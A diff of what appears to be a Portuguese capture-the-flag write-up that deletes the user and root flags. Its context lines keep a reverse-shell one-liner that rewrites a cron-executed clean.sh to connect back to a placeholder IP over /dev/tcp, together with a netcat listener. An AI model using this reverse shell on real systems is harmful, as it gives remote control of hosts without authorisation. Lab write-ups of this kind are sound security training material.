@@ -98,10 +98,6 @@ Resultado: reverse shell executada automaticamente pelo cron
 
 `echo -e "#!/bin/bash\nbash -c 'bash -i >& /dev/tcp/<SEU_IP>/4444 0>&1'" > clean.sh nc -lvnp 4444`
 
-**Flag user:**
-
-`cat /home/user.txt ➜ 90d6f992585815ff991e68748c414740`
-
 ---
 
 ## 6) Impacto & Severidade
@@ -164,13 +160,6 @@ Execução remota automatizada via cron + privesc com SUID = controle total do h
 ---
 
 ## 10) Apêndice técnico
-
-**Flags:**
-
-- User → `90d6f992585815ff991e68748c414740`
-    
-- Root → `4d930091c31a622a7ed10f27999af363`
-    
 
 **Arquivos recomendados**
 
